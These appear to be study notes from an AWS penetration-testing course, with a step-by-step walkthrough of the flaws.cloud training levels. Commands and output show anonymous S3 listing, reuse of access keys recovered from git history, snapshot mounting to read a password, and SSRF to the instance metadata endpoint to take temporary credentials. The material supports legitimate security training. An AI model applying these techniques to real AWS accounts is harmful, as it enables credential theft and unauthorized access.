# AWS

## ITProTV - Intro to AWS Penetration Testing

[https://www.linkedin.com/learning/introduction-to-aws-penetration-testing/](https://www.linkedin.com/learning/introduction-to-aws-penetration-testing/aws-keys?autoplay=true\&u=1504)

### Basic Concepts

#### AWS Pentesting Policy

[https://aws.amazon.com/security/penetration-testing/](https://aws.amazon.com/security/penetration-testing/)

#### AWS Keys

Comprised of access ID and the secret key itself.

* Create Key:
  * IAM --> Users --> Create access key
* View Keys:
  * IAM --> Users --> Security Credentials --> Access key ID

Find Keys:

<pre class="language-bash"><code class="lang-bash"><strong># Linux Location
</strong><strong>~/.aws/credentials
</strong># Windows Location
%USERPROFILE%/.aws/credentials
# Typical Entry
[default]
aws_access_key_id =
aws_secret_access_key =
</code></pre>

Check for Google dorks using ExploitDB. Ex: searching on `aws`

#### IAM (Identity and Access Management) Security Issues

* Create User:
  * IAM --> Users --> add Users
* Potential Issues
  * Weak password security (password strength)
  * Lack of MFA
  * Rotating Keys / Key revocation/deactivation
  * Too many permissions / privileges (least privileges)

#### S3 (Simple Storage Service)

* Create a bucket
  * S3 --> Buckets --> Create bucket
* Potential Issues
  * Public buckets
  * Permissions
  * Bucket versioning

Find Buckets:

```bash
nslookup flaws.cloud
Address: 52.218.245.11

# Reverse lookup
nslookup 52.218.245.11
11.245.218.52.in-addr.arpa    name = s3-website-us-west-2.amazonaws.com
```

Can also check website page source for S3 bucket URLs.

#### EC2 (Elastic Compute Cloud)

* After OS initial installation, update the OS/install patches (patch management)
* Update 3rd party software and services (email server, web server, etc.)
* AMI (Amazon Machine Image) - supported and maintained image provided by AWS that provides the information required to launch an instance

#### Lambda

AWS Lambda is a serverless, event-driven compute service that lets you run code for virtually any type of application or backend service without provisioning or managing servers.

* Make sure the code that is passed to it is properly sanitized
* Security misconfigurations such as permissions settings for other accounts
* Third partly libraries that are used
* Potential DoS if code takes input from users

#### ARNs (Amazon Resource Names)

A way to uniquely identify AWS resources. We require an ARN when you need to specify a resource unambiguously across all of AWS

* Can potentially leak information if such details can be accessed
* Be familiar with the Format and Paths

### Tools

#### AWS CLI

```bash
aws configure  #  Set Access Key ID, Secret Acces Key, Region name, output format
aws configure --profile <name>  # Set same as above for specific profile
aws --profile <name>
tail .aws/credentials  # Check the credentials files
aws help
aws iam <tab tab>
aws s3 <tab tab>
```

#### Pacu

The Open Source AWS Exploitation Framework

[https://rhinosecuritylabs.com/aws/pacu-open-source-aws-exploitation-framework/](https://rhinosecuritylabs.com/aws/pacu-open-source-aws-exploitation-framework/)

```bash
pacu  # Start up pacu
# Create/Select a session
Pacu () > help
Pacu () > import_keys <profile name from .aws/credentials file>  # Import existing keys

```

#### AWS Bucket Dump

Security Tool to Look For Interesting Files in S3 Buckets

[https://github.com/jordanpotti/AWSBucketDump](https://github.com/jordanpotti/AWSBucketDump)

```bash
# Example
python3 AWSBucketDump.py -l BucketNmes.txt -g interesting_Keywords.txt
```

#### GrayhatWarfare

Search Public Buckets

[https://buckets.grayhatwarfare.com/](https://buckets.grayhatwarfare.com/)

### Flaws

[http://flaws.cloud/](http://flaws.cloud/)

#### Level 1

> This level is _buckets_ of fun. See if you can find the first sub-domain.

Use `nslookup` on the given/known hostname:

```bash
C:\>nslookup flaws.cloud
Server:  localhost
Address:  127.0.0.1

Non-authoritative answer:
Name:    flaws.cloud
Addresses:  52.218.201.35
          52.218.201.59
          52.218.237.58
          52.218.242.210
          52.218.244.19
          52.218.244.139
          52.92.132.251
          52.92.195.179
```

Use `nslookup` on the found Addresses:

```bash
C:\>nslookup 52.218.201.35
Server:  localhost
Address:  127.0.0.1

Name:    s3-website-us-west-2.amazonaws.com
Address:  52.218.201.35
```

Identified that there is an S3 bucket in use.

Use `aws` CLI on the domain:

```bash
C:\>aws s3 ls s3://flaws.cloud --no-sign-request
2017-03-13 23:00:38       2575 hint1.html
2017-03-02 23:05:17       1707 hint2.html
2017-03-02 23:05:11       1101 hint3.html
2020-05-22 14:16:45       3162 index.html
2018-07-10 12:47:16      15979 logo.png
2017-02-26 20:59:28         46 robots.txt
2017-02-26 20:59:30       1051 secret-dd02c7c.html
```

Found an interesting file, secret-dd02c7c.html, which did in fact get us to Level 2.

#### Level 2

> The next level is fairly similar, with a slight twist. You're going to need your own AWS account for this. You just need the [free tier](https://aws.amazon.com/s/dm/optimization/server-side-test/free-tier/free\_np/).

Use `nslookup` on the given/known hostname:

```bash
C:\>nslookup level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
Server:  localhost
Address:  127.0.0.1

Non-authoritative answer:
Name:    level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
Addresses:  52.218.177.202
          52.218.219.90
          52.218.220.42
          52.218.233.194
          52.218.253.10
          52.92.180.179
          52.218.153.194
          52.218.170.67
```

Use `nslookup` on the found Addresses:

```bash
C:\Users\esanderford>nslookup 52.218.177.202
Server:  localhost
Address:  127.0.0.1

Name:    s3-website-us-west-2.amazonaws.com
Address:  52.218.177.202
```

Identified that there is an S3 bucket in use.

Use `aws` CLI on the domain:

```bash
C:\>aws s3 ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
2017-02-26 21:02:15      80751 everyone.png
2017-03-02 22:47:17       1433 hint1.html
2017-02-26 21:04:39       1035 hint2.html
2017-02-26 21:02:14       2786 index.html
2017-02-26 21:02:14         26 robots.txt
2017-02-26 21:02:15       1051 secret-e4443fc.html
```

Found an interesting file, secret-e4443fc.html, which did in fact get us to Level 3.

#### Level 3

> The next level is fairly similar, with a slight twist. Time to find your first AWS key! I bet you'll find something that will let you list what other buckets are.

Use `aws` CLI on the domain:

```bash
C:\>aws s3 ls s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
                           PRE .git/
2017-02-26 19:14:33     123637 authenticated_users.png
2017-02-26 19:14:34       1552 hint1.html
2017-02-26 19:14:34       1426 hint2.html
2017-02-26 19:14:35       1247 hint3.html
2017-02-26 19:14:33       1035 hint4.html
2020-05-22 14:21:10       1861 index.html
2017-02-26 19:14:33         26 robots.txt
```

Used `--recursive` as there was a PRE (Prefix) found for the file/path .git.

```bash
C:\>aws s3 ls s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud --recursive
2017-09-17 11:12:24         52 .git/COMMIT_EDITMSG
2017-09-17 11:12:24         23 .git/HEAD
2017-09-17 11:12:24        130 .git/config
2017-09-17 11:12:24         73 .git/description
2017-09-17 11:12:24        452 .git/hooks/applypatch-msg.sample
2017-09-17 11:12:24        896 .git/hooks/commit-msg.sample
2017-09-17 11:12:24        189 .git/hooks/post-update.sample
2017-09-17 11:12:24        398 .git/hooks/pre-applypatch.sample
2017-09-17 11:12:24       1704 .git/hooks/pre-commit.sample
2017-09-17 11:12:24       4898 .git/hooks/pre-rebase.sample
2017-09-17 11:12:24       1239 .git/hooks/prepare-commit-msg.sample
2017-09-17 11:12:24       3611 .git/hooks/update.sample
2017-09-17 11:12:24        600 .git/index
2017-09-17 11:12:24        240 .git/info/exclude
2017-09-17 11:12:24        359 .git/logs/HEAD
2017-09-17 11:12:24        359 .git/logs/refs/heads/master
2017-09-17 11:12:24        679 .git/objects/0e/aa50ae75709eb4d25f07195dc74c7f3dca3e25
2017-09-17 11:12:24        770 .git/objects/2f/c08f72c2135bb3af7af5803abb77b3e240b6df
2017-09-17 11:12:25        820 .git/objects/53/23d77d2d914c89b220be9291439e3da9dada3c
2017-09-17 11:12:25        245 .git/objects/61/a5ff2913c522d4cf4397f2500201ce5a8e097b
2017-09-17 11:12:25     112013 .git/objects/76/e4934c9de40e36f09b4e5538236551529f723c
2017-09-17 11:12:25        560 .git/objects/92/d5a82ef553aae51d7a2f86ea0a5b1617fafa0c
2017-09-17 11:12:25        191 .git/objects/b6/4c8dcfa8a39af06521cf4cb7cdce5f0ca9e526
2017-09-17 11:12:25         42 .git/objects/c2/aab7e03933a858d1765090928dca4013fe2526
2017-09-17 11:12:25        904 .git/objects/db/932236a95ebf8c8a7226432cf1880e4b4017f2
2017-09-17 11:12:25         98 .git/objects/e3/ae6dd991f0352cc307f82389d354c65f1874a2
2017-09-17 11:12:25        279 .git/objects/f2/a144957997f15729d4491f251c3615d508b16a
2017-09-17 11:12:25        125 .git/objects/f5/2ec03b227ea6094b04e43f475fb0126edb5a61
2017-09-17 11:12:25         41 .git/refs/heads/master
2017-02-26 19:14:33     123637 authenticated_users.png
2017-02-26 19:14:34       1552 hint1.html
2017-02-26 19:14:34       1426 hint2.html
2017-02-26 19:14:35       1247 hint3.html
2017-02-26 19:14:33       1035 hint4.html
2020-05-22 14:21:10       1861 index.html
2017-02-26 19:14:33         26 robots.txt
```

Downloaded the .git repository locally:

```bash
C:\>aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud .
...
```

Used `git` to enumerate the logs, commits, and branches:

```bash
C:\flaws-level3>git show
commit b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526 (HEAD -> master)
Author: 0xdabbad00 <scott@summitroute.com>
Date:   Sun Sep 17 09:10:43 2017 -0600

    Oops, accidentally added something I shouldn't have

diff --git a/access_keys.txt b/access_keys.txt
deleted file mode 100644
index e3ae6dd..0000000
--- a/access_keys.txt
+++ /dev/null
@@ -1,2 +0,0 @@
-access_key AKIAJ366LIPB4IJKT7SA
-secret_access_key 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
```

Now to create an AWS profile locally with the found Access Key and Secret Access Key.

```bash
C:\flaws-level3>aws configure --profile flaws-l3
AWS Access Key ID [None]: AKIAJ366LIPB4IJKT7SA
AWS Secret Access Key [None]: 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
Default region name [None]:
Default output format [None]:
```

Can view all the buckets this profile has access to:

```bash
C:\Users\esanderford\flaws-level3>aws --profile flaws-l3 s3 ls
2017-02-12 16:31:07 2f4e53154c0a7fd086a04a12a452c2a4caed8da0.flaws.cloud
2017-05-29 12:34:53 config-bucket-975426262029
2017-02-12 15:03:24 flaws-logs
2017-02-04 22:40:07 flaws.cloud
2017-02-23 20:54:13 level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
2017-02-26 13:15:44 level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
2017-02-26 13:16:06 level4-1156739cfb264ced6de514971a4bef68.flaws.cloud
2017-02-26 14:44:51 level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud
2017-02-26 14:47:58 level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud
2017-02-26 15:06:32 theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud
```

The Level 4 bucket URL was leaked which can be navigated to get us to Level 4.

#### Level 4

> For the next level, you need to get access to the web page running on an EC2 at 4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud
>
> It'll be useful to know that a snapshot was made of that EC2 shortly after nginx was setup on it.

Use `nslookup` on the given/known hostname:

```bash
C:\>nslookup 4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud
Server:  localhost
Address:  127.0.0.1

Non-authoritative answer:
Name:    ec2-35-165-182-7.us-west-2.compute.amazonaws.com
Address:  35.165.182.7
Aliases:  4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud
```

Identified that an EC2 is in use.

Use `aws` CLI on the domain:

```bash
C:\>aws --profile flaws-l3 ec2 describe-volumes --region us-west-2
...
```

Try to look at any found snapshots:

```bash
C:\>aws --profile flaws-l3 ec2 describe-snapshots --snapshot-id snap-0f23409e560e2f059 --region us-west-2

```

Get user account info:

```bash
C:\>aws --profile flaws-l3 sts get-caller-identity
{
    "UserId": "AIDAJQ3H5DC3LEG2BKSLC",
    "Account": "975426262029",
    "Arn": "arn:aws:iam::975426262029:user/backup"
}
```

Try to look at any snapshots owned by the user:

```bash
C:\>aws --profile flaws-l3 ec2 describe-snapshots --owner-id 975426262029 --region us-west-2
...
```

```bash
C:\>aws --profile cloudgoat ec2 describe-intances --region us-west2
```

Create a volume you own to attach the found snapshot to:

<pre class="language-bash"><code class="lang-bash"><strong>C:\>aws --profile cloudgoat ec2 create-volume --availability-zone us-west-2a --region us-west-2 --snapshot-id snap...
</strong>
</code></pre>

Attach the found snapshot to the volume that you created:

<pre class="language-bash"><code class="lang-bash"><strong>C:\>aws --profile cloudgoat ec2 attach-volume --volume-id &#x3C;> --instance-id &#x3C;> --device /dev/sdf --region us-west-2
</strong>
</code></pre>

Log into our instance and access the attached snapshot:

```bash
C:\>ssh -i itprotv-us-west.pem ubuntu@<IP>
~$ lsblk  # Look at the block storage
```

Mount the new storage block:

```bash
sudo mount /dev/xvdf1 /mnt
~$ cd /mnt
```

Enumerate mounted filesystem/data:

```bash
~$ cd /mnt/home/ubuntu
~$ cat setupNginx.sh
htpasswd -b /etc/nginx/.htpasswd flaws nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M
```

#### Level 5

> This EC2 has a simple HTTP only proxy on it. Here are some examples of it's usage:
>
> * http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/flaws.cloud/
> * http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/summitroute.com/blog/feed.xml
> * http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/neverssl.com/&#x20;
>
> See if you can use this proxy to figure out how to list the contents of the level6 bucket at level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud that has a hidden directory in it.

[http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/](http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/)

Check for metadata by navigating to and enumerating each found location:

[http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/](http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/)

[https://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest](https://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest)

[http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws](http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws)

And Access Key ID, Secret Access Key, and tokens are found:

```json
{
  "Code" : "Success",
  "LastUpdated" : "2022-12-15T21:45:50Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIA6GG7PSQGRMFNA7VH",
  "SecretAccessKey" : "q6a2Sprv7E1I505PvTGyleJbegO/g684v0L+QZ9v",
  "Token" : "IQoJb3JpZ2luX2VjEM7//////////wEaCXVzLXdlc3QtMiJGMEQCIA+egW9aB4GhymwvQZujoz1SJwzi7FumIFpAj49IVGYvAiABcYFjldGUpiGdMomai9dsYvOXlLn5pK90IohA5hPRairVBAj3//////////8BEAMaDDk3NTQyNjI2MjAyOSIMs9ZW3OjPio+IRxGeKqkE5f7U2pocgG10S++NsKUW7XItKj4BnsbTeVSfGNyPajbHy5QEhwZU0BjVpTksI3GCoejsrEJc3mH0G6o6tIm5ZdDiV8VrJ7+/QIJ9x8hCHe3QxQpp10PjwMFh/gRPuk5rZuUNHG/gfzlnfGsvd9v2fsVj+f3zhlVRvL0NPUSJsW5uScKkB8d+HuG0/Ccrw3ADmTiz4NEI9TWjI0yQEiYlDD51L14R08ejD2XFdTPU3biGEEuYpCmUbZ6OMnDxeTTVa1QmdiRX2E3I/KbBj4EL67o10PWzSPlegu/gfospc1KZaepK3WfYDY0Vwwj+bepxFYwrjFWnCkHmnCG/WWTM1+1FGt1qiRMcid4O6DgPBVN/zOrpWsw7ibi24H5EHhn1tam7zXCDTAyqVzFWanME+C0CLz6ADH8IYA8T2xz2OqGs3iQX6nj5bpSKWIvIUbQXCNb290FAi+Zu9Mb7Sc45gXsEL0Y0IBSRMZkBl73jkuCCLmzseoOHft1CmMwt3ITgtTnFLR/rpb6aT3BZ9LIZPq5Lhxnqk1ajxznaQkSbOeEXOum/MFXEkkvbUviSP3PPIoPTq7N0PPAHbrnpL4AhUK59zJU58LD4Ms2IoMRSKpZwkV0YCbMTYfGFSIuYZRZdBJNPYMKtiMw61BPmY3KYG6R6utBKyr3d4e4oFWG8lAOjMfeaXKsEpgI7LHOUcsX3qq9ZtHc8e2JqoAiF/oFRZPL3WJIgToy+QjDUqu6cBjqqAa1saty2UoM4I34TShElODyrLD2p0HfiL7iHQwxM4fuzx+pz7ZKaVRx8evYSxxQ5BWy6s4Lc+8uYv5tRgB9XM7S42MMPytPL3wjwxCzWd2i0v9U12gUDZGxDAGRXXQRbIrPYQCQuZVW5VRHolIcnypWZiIbAYCCtgW/j4TyuVcuxRLlRlurgzR0wX6SG5NUb1YhjjLP/dfDj4N9/HFSo8w8IQ1fvGUQXbt4s",
  "Expiration" : "2022-12-16T04:04:03Z"
}
```

Configure a new profile with the found Access Key ID, Secret Access Key and token:

```bash
C:\flaws-level5>aws configure --profile flaws-l5
AWS Access Key ID [None]: ASIA6GG7PSQGRMFNA7VH
AWS Secret Access Key [None]: q6a2Sprv7E1I505PvTGyleJbegO/g684v0L+QZ9v
Default region name [None]: us-west-2
Default output format [None]:
# Have to manually add the token to the .aws/credentials file
aws_secret_token = <TOKEN>
```

Access the S3 bucket found at the give URL:

```bash
C:\>aws --profile flaws-l5 s3 ls level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud
                           PRE ddcc78ff/
2017-02-26 21:11:07        871 index.html
```

Found an interesting path, ddcc78ff/, appended to the URL which got us to Level 6.

#### Level 6



### CloudGoat

[https://rhinosecuritylabs.com/aws/cloudgoat-vulnerable-design-aws-environment/](https://rhinosecuritylabs.com/aws/cloudgoat-vulnerable-design-aws-environment/)

#### Configuration CloudGoat

#### IAM PrivEsc by Rollback

#### Lambda PriveEsc

#### Lambda PrivEsc Pt 2

#### Cloud Breach S3

#### IAM PrivEsc by Attachment

#### EC2 SSRF
